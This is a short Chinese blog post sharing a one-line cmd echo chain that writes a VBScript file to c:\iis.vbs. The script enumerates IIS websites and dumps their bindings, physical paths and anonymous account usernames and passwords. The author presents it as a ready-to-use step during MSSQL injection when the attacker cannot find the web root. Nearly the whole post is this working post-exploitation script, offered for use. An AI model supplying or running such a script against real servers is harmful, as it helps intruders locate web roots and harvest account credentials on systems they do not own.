+++
title = "echo 一句话写入读IIS配置vbs脚本"
author = "Hzllaga"
date =  2018-04-06
description = "最近又好多人来找我要这个，直接用echo写入，很方便的，遇到mssql注入找不到路径就运行这个然后cscript c:\\iis.vbs就可以了！"
categories = ["原创"]
tags = ["vbs"]
+++
最近又好多人来找我要这个，直接用echo写入，很方便的，遇到mssql注入找不到路径就运行这个然后cscript c:\\iis.vbs就可以了！
![](https://cdn.wtfsec.org/img/20200223163824.png)
code:
{{< highlight vbs >}}
echo Set ObjService=GetObject("IIS://LocalHost/W3SVC")>>c:\iis.vbs & echo For Each obj3w In objservice >>c:\iis.vbs & echo childObjectName=replace(obj3w.AdsPath,Left(obj3w.Adspath,22),"")>>c:\iis.vbs & echo if IsNumeric(childObjectName)=true then>>c:\iis.vbs & echo set IIs=objservice.GetObject("IIsWebServer",childObjectName)>>c:\iis.vbs & echo if err.number^<^>0 then>>c:\iis.vbs & echo exit for>>c:\iis.vbs & echo msgbox("error!")>>c:\iis.vbs & echo wscript.quit>>c:\iis.vbs & echo end if>>c:\iis.vbs & echo serverbindings=IIS.serverBindings>>c:\iis.vbs & echo ServerComment=iis.servercomment>>c:\iis.vbs & echo set IISweb=iis.getobject("IIsWebVirtualDir","Root")>>c:\iis.vbs & echo user=iisweb.AnonymousUserName>>c:\iis.vbs & echo pass=iisweb.AnonymousUserPass>>c:\iis.vbs & echo path=IIsWeb.path>>c:\iis.vbs & echo list=list^&servercomment^&" "^&user^&" "^&pass^&" "^&join(serverBindings,",")^&" "^&path^& vbCrLf ^& vbCrLf>>c:\iis.vbs & echo end if>>c:\iis.vbs & echo Next >>c:\iis.vbs & echo wscript.echo list >>c:\iis.vbs & echo Set ObjService=Nothing >>c:\iis.vbs & echo wscript.echo "x" ^&vbTab^&vbCrLf>>c:\iis.vbs & echo WScript.Quit>>c:\iis.vbs
{{< /highlight >}}